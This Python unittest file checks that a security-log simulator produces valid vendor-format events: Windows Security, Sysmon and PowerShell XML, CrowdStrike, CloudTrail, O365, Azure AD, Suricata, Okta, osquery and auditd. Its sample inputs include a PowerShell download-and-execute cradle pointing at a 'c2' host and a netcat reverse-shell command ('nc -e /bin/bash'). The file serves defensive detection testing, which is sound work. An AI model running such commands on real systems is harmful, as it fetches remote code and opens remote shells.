"""Wave-1 Authentic Source Expansion — offline RAW-fidelity contract tests.

Verifies (classification chain: OFFLINE_VERIFIED entry point):
  * every declared Wave-1 family generates vendor-native RAW that is
    structurally valid (XML parse / JSON parse / auditd token grammar)
  * RAW carries ZERO NetSpout correlation metadata (HEC-side only)
  * sourcetype dispatch is exact per family
  * engine bindings on SplunkLogEngine work
  * provenance for the RAW reference corpus is intact (sha256 ledger)
"""

import hashlib
import json
import os
import sys
import unittest
import xml.etree.ElementTree as ET

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SRC_DIR = os.path.join(REPO_ROOT, "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from netspout_core.models import Node
from netspout_core.log_engine import SplunkLogEngine
from netspout_core.wave1_authentic_engine import Wave1AuthenticEngine as W1

DEV = Node(id="wave1-test-node", name="WAVE1-TEST-HOST.corp.local",
           ip_address="10.0.9.9")

EXPECTED_EVENT_FAMILY_TOTAL = 70


def _entries(result):
    return result if isinstance(result, (list, tuple)) else [result]


class TestWave1CatalogRegistry(unittest.TestCase):
    """Wave-1 declarative registry stays consistent with the engine."""

    def test_01_registry_counts_match_engine(self):
        with open(os.path.join(REPO_ROOT, "catalog", "wave1_source_expansion.json")) as fh:
            reg = json.load(fh)
        self.assertEqual(len(reg["sources"]), 12)
        self.assertEqual(len(SplunkLogEngine.WAVE1_SOURCE_SOURCETYPES),
                         len(reg["sources"]))
        total = sum(s["event_family_count"] for s in reg["sources"])
        self.assertEqual(total, EXPECTED_EVENT_FAMILY_TOTAL)
        self.assertEqual(reg["counts_summary"]["event_families"],
                         EXPECTED_EVENT_FAMILY_TOTAL)
        wave_sts = {s["splunk_sourcetype"] for s in reg["sources"]}
        self.assertEqual(wave_sts, set(SplunkLogEngine.WAVE1_SOURCE_SOURCETYPES))

    def test_02_graduated_pinned_counters(self):
        """Canonical graduation: >=313 sourcetypes floor documented; vendors now 53 (3 Wave-3 additions)."""
        with open(os.path.join(REPO_ROOT, "catalog", "sourcetypes.json")) as fh:
            self.assertGreaterEqual(len(json.load(fh)), 280)
        with open(os.path.join(REPO_ROOT, "catalog", "vendors.json")) as fh:
            self.assertEqual(len(json.load(fh)), 66)

    def test_03_provenance_ledger_intact(self):
        prov_path = os.path.join(REPO_ROOT, "catalog", "raw_reference", "provenance.json")
        with open(prov_path) as fh:
            prov = json.load(fh)
        self.assertEqual(prov["pinned_commit"],
                         "1b2142fdd2d1358b4ac6ad3dfc47e5e455e619e8")
        self.assertEqual(prov["upstream_license"], "Apache-2.0 (splunk/security_content datasets)")
        self.assertGreaterEqual(len(prov["references"]), 10)
        for ref in prov["references"]:
            if ref.get("raw_reference_file"):
                rel = ref["raw_reference_file"]
                if rel.startswith("catalog/"):
                    # Wave-3+ refs record a repo-relative corpus path
                    head_path = os.path.join(REPO_ROOT, rel)
                else:
                    head_path = os.path.join(REPO_ROOT, "catalog",
                                             "raw_reference",
                                             rel.split("/")[-1])
            else:
                name = ref["sourcetype"].replace(":", "_").replace("/", "_").replace("-", "_")
                head_path = os.path.join(REPO_ROOT, "catalog", "raw_reference",
                                         "%s.head.bin" % name)
            with open(head_path, "rb") as fh:
                data = fh.read()
            self.assertEqual(hashlib.sha256(data).hexdigest(), ref["fetched_sha256"],
                             "reference corpus mutated: %s" % head_path)


class TestWindowsEventXMLFamilies(unittest.TestCase):
    """Vendor-native Windows Event XML fidelity (XmlWinEventLog)."""

    def _check_xml_event(self, entry, expected_event_id=None, expected_channel=None,
                         expected_provider=None):
        root = ET.fromstring(entry.raw_log)
        eid = root.find(".//{*}System/{*}EventID")
        chan = root.find(".//{*}Channel")
        provider = root.find(".//{*}Provider")
        self.assertIsNotNone(eid)
        self.assertIsNotNone(chan)
        self.assertIsNotNone(provider)
        if expected_event_id:
            self.assertIn(int(eid.text), list(expected_event_id) if
                          not isinstance(expected_event_id, int) else [expected_event_id])
        if expected_channel:
            self.assertEqual((chan.text or "").strip(), expected_channel)
        if expected_provider:
            self.assertEqual(provider.get("Name"), expected_provider)
        data_names = [d.get("Name") for d in root.findall(".//{*}EventData/{*}Data")]
        self.assertGreater(len(data_names), 0)
        self.assertNotIn("", data_names)
        self.assertNotIn("netspout", entry.raw_log.lower())

    def test_01_security_channel_id_map(self):
        id_map = {
            "logon_success": (4624, 4672), "logon_failure": (4625,),
            "logoff": (4634,), "explicit_credential": (4648,),
            "special_logon": (4672,), "user_created": (4720,),
            "group_member_added": (4732,), "account_locked_out": (4740,),
            "file_access": (4663,),
        }
        for family, ids in id_map.items():
            out = W1.format_windows_security_xml_log(
                DEV, family, "svc-ldap", "CORP", "10.0.9.9", "x.corp")
            for entry in _entries(out):
                self.assertEqual(entry.sourcetype, "XmlWinEventLog:Security")
                self._check_xml_event(entry, expected_event_id=ids,
                                      expected_channel="Security",
                                      expected_provider=
                                      "Microsoft-Windows-Security-Auditing")

    def test_02_logon_success_4624_4672_correlated_pair(self):
        out = W1.format_windows_security_xml_log(
            DEV, "logon_success", "netops", "CORP", "10.0.9.9", "x.corp")
        self.assertEqual(len(out), 2, "4624 must emit with its 4672 companion")
        self.assertEqual([ET.fromstring(e.raw_log).find(
            ".//{*}System/{*}EventID").text for e in out], ["4624", "4672"])

    def test_03_sysmon_families_structural(self):
        eid_map = {"process_create": 1, "network_connect": 3, "process_access": 10,
                   "file_create": 11, "registry_set": 13, "dns_query": 22}
        for family, eid in eid_map.items():
            e = W1.format_windows_sysmon_xml_log(
                DEV, family, "x.corp", "10.0.9.9", "10.1.2.3",
                "C:\\\\Windows\\\\System32\\\\psexec.exe", "psexec")
            self.assertEqual(e.sourcetype,
                             "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational")
            self._check_xml_event(e, expected_event_id=eid,
                                  expected_channel=
                                  "Microsoft-Windows-Sysmon/Operational",
                                  expected_provider="Microsoft-Windows-Sysmon")
        nc = W1.format_windows_sysmon_xml_log(
            DEV, "network_connect", "x.corp", "10.0.9.9", "10.1.2.3",
            "C:\\\\app\\\\net.exe", "net use")
        root = ET.fromstring(nc.raw_log)
        dest = [d.text for d in root.findall(".//{*}EventData/{*}Data")
                if d.get("Name") == "DestinationIp"]
        self.assertEqual(dest, ["10.1.2.3"])

    def test_04_powershell_families(self):
        for family, eid in (("module_logging", 4103), ("script_block", 4104)):
            e = W1.format_windows_powershell_xml_log(
                DEV, family, "x.corp", "10.0.9.9",
                "IEX (New-Object Net.WebClient).DownloadString('http://c2/ps1')")
            self.assertEqual(e.sourcetype,
                             "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational")
            self._check_xml_event(e, expected_event_id=eid)

    def test_05_timecreated_sevendigit_format(self):
        e = W1.format_windows_sysmon_xml_log(
            DEV, "process_create", "x.corp", "10.0.9.9", "10.1.2.3", "C:\\\\a.exe", "a")
        root = ET.fromstring(e.raw_log)
        tc = root.find(".//{*}TimeCreated").get("SystemTime")
        self.assertIn("T", tc)
        self.assertTrue(tc.endswith("Z"))
        frac = tc.split(".")[1].strip("Z")
        self.assertEqual(len(frac), 7, "Windows EventLog SystemTime uses 7 fraction digits")


class TestJSONSourceFamilies(unittest.TestCase):
    """Vendor-native JSON RAW contract for EDR/cloud/identity sources."""

    def test_01_crowdstrike_sensor_schema(self):
        for fam in W1.CROWDSTRIKE_FAMILIES:
            e = W1.format_crowdstrike_falcon_sensor_log(
                DEV, fam, "10.0.9.9", "10.0.1.44", "C:\\\\x.exe", "whoami")[0]
            self.assertEqual(e.sourcetype, "crowdstrike:events:sensor")
            body = json.loads(e.raw_log)
            for key in ("aid", "cid", "aip", "ComputerName", "event_platform",
                        "event_simpleName", "timestamp"):
                self.assertIn(key, body, "crowdstrike key %s missing" % key)
        rollup = json.loads(W1.format_crowdstrike_falcon_sensor_log(
            DEV, "ProcessRollup2", "10.0.9.9", "10.0.1.44", "C:\\\\x.exe",
            "whoami -l")[0].raw_log)
        self.assertEqual(rollup["event_simpleName"], "ProcessRollup2")
        self.assertIn("CommandLine", rollup)

    def test_02_cloudtrail_schema(self):
        for fam in W1.CLOUDTRAIL_FAMILIES:
            e = W1.format_aws_cloudtrail_log(DEV, fam, "10.0.9.9")
            self.assertEqual(e.sourcetype, "aws:cloudtrail")
            body = json.loads(e.raw_log)
            for key in ("eventVersion", "userIdentity", "eventTime", "eventSource",
                        "eventName", "awsRegion", "sourceIPAddress", "eventID"):
                self.assertIn(key, body)
        ct = json.loads(W1.format_aws_cloudtrail_log(
            DEV, "console_login", "10.0.9.9").raw_log)
        self.assertEqual(ct["eventSource"], "signin.amazonaws.com")

    def test_03_o365_schema(self):
        for fam in W1.O365_FAMILIES:
            e = W1.format_o365_management_log(DEV, fam, "10.0.9.9")
            self.assertEqual(e.sourcetype, "o365:management:activity")
            body = json.loads(e.raw_log)
            for key in ("CreationTime", "Id", "Operation", "OrganizationId",
                        "RecordType", "UserKey", "UserId", "Workload"):
                self.assertIn(key, body)
        failed = json.loads(W1.format_o365_management_log(
            DEV, "user_login_failed", "10.0.9.9").raw_log)
        self.assertEqual(failed["ResultStatus"], "Failed")
        self.assertEqual(failed["LogonError"], "SsoArtifactInvalidOrExpired")

    def test_04_azure_aad_schema(self):
        for fam in W1.AZURE_AAD_FAMILIES:
            e = W1.format_azure_monitor_aad_log(DEV, fam, "10.0.9.9")
            self.assertEqual(e.sourcetype, "azure:monitor:aad")
            body = json.loads(e.raw_log)
            for key in ("time", "resourceId", "operationName", "category", "properties"):
                self.assertIn(key, body)
        fail = json.loads(W1.format_azure_monitor_aad_log(
            DEV, "sign_in_failure", "10.0.9.9").raw_log)
        self.assertEqual(fail["category"], "SignInLogs")
        self.assertEqual(fail["properties"]["status"]["failureDetails"][0]["errorCode"], 50126)
        audit = json.loads(W1.format_azure_monitor_aad_log(
            DEV, "audit_user_created", "10.0.9.9").raw_log)
        self.assertEqual(audit["category"], "AuditLogs")

    def test_05_suricata_eve_schema(self):
        for fam in W1.SURICATA_FAMILIES:
            e = W1.format_suricata_eve_log(DEV, fam, "10.0.9.9", "203.0.113.7", 80)
            self.assertEqual(e.sourcetype, "suricata")
            body = json.loads(e.raw_log)
            for key in ("timestamp", "flow_id", "event_type", "src_ip", "dest_ip",
                        "src_port", "dest_port", "proto"):
                self.assertIn(key, body)
            self.assertIn(body["event_type"],
                          ("alert", "http", "dns", "flow", "tls", "fileinfo"))
        alert = json.loads(W1.format_suricata_eve_log(
            DEV, "alert", "10.0.9.9", "203.0.113.7", 80).raw_log)
        self.assertIn("alert", alert)
        self.assertIn("signature_id", alert["alert"])

    def test_06_okta_schema(self):
        for fam in W1.OKTA_FAMILIES:
            e = W1.format_okta_log(DEV, fam, "10.0.9.9")
            self.assertEqual(e.sourcetype, "OktaIM2:log")
            body = json.loads(e.raw_log)
            for key in ("actor", "client", "authenticationContext", "displayMessage",
                        "eventType", "outcome", "published", "securityContext", "severity"):
                self.assertIn(key, body)
        denied = json.loads(W1.format_okta_log(
            DEV, "policy_signon_denial", "10.0.9.9").raw_log)
        self.assertEqual(denied["outcome"]["result"], "DENY")

    def test_07_osquery_schema(self):
        for fam in W1.OSQUERY_FAMILIES:
            rows = W1.format_osquery_results_log(DEV, fam, "10.0.9.9")
            self.assertTrue(rows)
            for e in rows:
                self.assertEqual(e.sourcetype, "osquery:results")
                body = json.loads(e.raw_log)
                for key in ("action", "calendarTime", "unixTime", "hostIdentifier",
                            "name", "columns"):
                    self.assertIn(key, body)
                self.assertIn(body["action"], ("added", "removed"))


class TestLinuxTextFamilies(unittest.TestCase):
    """auditd + sysmon:linux text/XML contract."""

    def test_01_auditd_record_grammar(self):
        groups = W1.format_linux_auditd_log(DEV, "syscall_execve", "10.0.9.9")[0:3]
        lines = [e.raw_log for e in groups]
        self.assertEqual(len(lines), 3, "SYSCALL+EXECVE+PROCTITLE group")
        for line in lines:
            self.assertIn("msg=audit(", line)
            self.assertRegex(line, r"audit\(\d{2}/\d{2}/\d{4} \d{2}:\d{2}:\d{2}\.\d{3}:\d+\)")
            self.assertNotIn("netspout", line.lower())
        self.assertIn("type=SYSCALL", lines[0])
        self.assertIn("syscall=59", lines[0])
        self.assertIn('exe="/usr/bin/cat"', lines[0])

    def test_02_auditd_user_auth(self):
        ok = W1.format_linux_auditd_log(DEV, "user_auth_success", "10.0.9.9")[0]
        self.assertIn("type=USER_AUTH", ok.raw_log)
        self.assertIn("res=success", ok.raw_log)
        bad = W1.format_linux_auditd_log(DEV, "user_auth_failure", "10.0.9.9")[0]
        self.assertIn("res=fail", bad.raw_log)

    def test_03_sysmon_linux_provider(self):
        for fam in W1.SYSMON_LINUX_FAMILIES:
            e = W1.format_sysmon_linux_log(DEV, fam, "10.0.9.9", "10.0.1.44",
                                           "/usr/bin/nc", "nc -e /bin/bash x 8000")
            self.assertEqual(e.sourcetype, "sysmon:linux")
            root = ET.fromstring(e.raw_log)
            prov = root.find(".//{*}Provider")
            self.assertEqual(prov.get("Name"), "Linux-Sysmon")
            chan = root.find(".//{*}Channel")
            self.assertEqual((chan.text or "").strip(), "Linux-Sysmon/Operational")
            self.assertNotIn("netspout", e.raw_log.lower())


class TestEngineBindingsAndGuarantees(unittest.TestCase):
    """SplunkLogEngine dispatch + in-RAW purity guarantees."""

    def test_01_all_bindings_reachable(self):
        for st, method in SplunkLogEngine.WAVE1_SOURCE_SOURCETYPES.items():
            self.assertTrue(callable(getattr(SplunkLogEngine, method, None)),
                            "binding missing: %s" % method)

    def test_02_no_correlation_metadata_inside_raw(self):
        markers = ("netspout_run_id", "netspout_scenario_id", "netspout_phase",
                   "netspout_device_id", "netspout_event_id",
                   "netspout_parent_event_id", "netspout_ground_truth")
        cases = [W1.format_windows_security_xml_log(DEV, "user_created", "u", "CORP",
                                                    "10.0.9.9", "x.corp")[0],
                 W1.format_windows_sysmon_xml_log(DEV, "dns_query", "x.corp",
                                                  "10.0.9.9", "10.1.2.3",
                                                  "C:\\\\a.exe", "a"),
                 W1.format_windows_powershell_xml_log(DEV, "script_block", "x.corp",
                                                      "10.0.9.9", "x"),
                 W1.format_crowdstrike_falcon_sensor_log(DEV, "DnsRequest",
                                                         "10.0.9.9", "10.1.2.3",
                                                         "C:\\\\x.exe", "x")[0],
                 W1.format_sysmon_linux_log(DEV, "file_create", "10.0.9.9",
                                            "10.1.2.3", "/bin/x", "x"),
                 W1.format_aws_cloudtrail_log(DEV, "create_trail", "10.0.9.9"),
                 W1.format_o365_management_log(DEV, "inbox_rule_created", "10.0.9.9"),
                 W1.format_azure_monitor_aad_log(DEV, "audit_role_assigned", "10.0.9.9"),
                 W1.format_suricata_eve_log(DEV, "tls", "10.0.9.9", "10.1.2.3", 443),
                 W1.format_linux_auditd_log(DEV, "syscall_openat", "10.0.9.9")[0],
                 W1.format_okta_log(DEV, "user_authentication_sso", "10.0.9.9"),
                 W1.format_osquery_results_log(DEV, "users_listed", "10.0.9.9")[0]]
        for e in cases:
            low = e.raw_log.lower()
            for marker in markers:
                self.assertNotIn(marker, low,
                                 "correlation marker leaked into vendor RAW (%s)" % e.sourcetype)

    def test_03_unknown_family_rejected(self):
        with self.assertRaises(ValueError):
            W1.format_windows_security_xml_log(DEV, "not_a_family", "u", "CORP",
                                               "10.0.9.9", "h")
        with self.assertRaises(ValueError):
            W1.format_windows_sysmon_xml_log(DEV, "nope", "h", "10.0.9.9",
                                             "10.1.2.3", "img", "cmd")
        with self.assertRaises(ValueError):
            W1.format_windows_powershell_xml_log(DEV, "nope", "h", "10.0.9.9", "x")
        with self.assertRaises(ValueError):
            W1.format_crowdstrike_falcon_sensor_log(DEV, "bogus", "10.0.9.9",
                                                    "10.1.2.3", "img", "cmd")
        with self.assertRaises(ValueError):
            W1.format_sysmon_linux_log(DEV, "nope", "10.0.9.9", "10.1.2.3",
                                       "img", "cmd")
        with self.assertRaises(ValueError):
            W1.format_aws_cloudtrail_log(DEV, "bogus", "10.0.9.9")
        with self.assertRaises(ValueError):
            W1.format_o365_management_log(DEV, "bogus", "10.0.9.9")
        with self.assertRaises(ValueError):
            W1.format_azure_monitor_aad_log(DEV, "bogus", "10.0.9.9")
        with self.assertRaises(ValueError):
            W1.format_suricata_eve_log(DEV, "bogus", "10.0.9.9", "10.1.2.3", 80)
        with self.assertRaises(ValueError):
            W1.format_linux_auditd_log(DEV, "bogus", "10.0.9.9")
        with self.assertRaises(ValueError):
            W1.format_okta_log(DEV, "bogus", "10.0.9.9")
        with self.assertRaises(ValueError):
            W1.format_osquery_results_log(DEV, "bogus", "10.0.9.9")

    def test_04_deterministic_ids(self):
        a = W1.format_crowdstrike_falcon_sensor_log(DEV, "ProcessRollup2",
                                                    "10.0.9.9", "10.1.2.3",
                                                    "C:\\\\x.exe", "x")[0]
        b = W1.format_crowdstrike_falcon_sensor_log(DEV, "ProcessRollup2",
                                                    "10.0.9.9", "10.1.2.3",
                                                    "C:\\\\x.exe", "x")[0]
        self.assertEqual(json.loads(a.raw_log)["cid"], json.loads(b.raw_log)["cid"])


if __name__ == "__main__":
    unittest.main()
